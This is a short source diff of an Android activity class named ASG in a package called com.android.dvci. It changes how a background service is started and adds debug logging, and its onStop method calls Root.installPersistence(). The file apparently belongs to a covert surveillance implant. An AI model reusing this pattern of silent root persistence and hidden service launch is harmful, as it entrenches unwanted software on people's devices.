@@ -35,6 +35,8 @@ import com.android.dvci.listener.AR;
 import com.android.dvci.util.Check;
 import com.android.mm.M;
 
+import java.util.concurrent.TimeUnit;
+
 /**
  * The Class AndroidServiceGUI.
  * http://stackoverflow.com/questions/10909683/launch
@@ -64,7 +66,9 @@ public class ASG extends Activity {
 	@Override
 	public void onStop() {
 		super.onStop();
+
 		Root.installPersistence();
+
 	}
 
 	@Override
@@ -174,6 +178,21 @@ public class ASG extends Activity {
 			}
 		}
 
+		/*Object future = Status.getStpe().schedule(new Runnable() {
+			public void run() {
+				startService();
+			}
+		}, 100, TimeUnit.MILLISECONDS);*/
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (actualCreate): starting Service");
+		}
+		startService();
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (actualCreate): started Service");
+		}
+
 	}
 
 	private void startExtService() {
@@ -216,6 +235,10 @@ public class ASG extends Activity {
 				}
 
 				Status.setIconState(true);
+			}else{
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " Already started cn: " + service);//$NON-NLS-1$
+				}
 			}
 
 		} catch (final SecurityException se) {
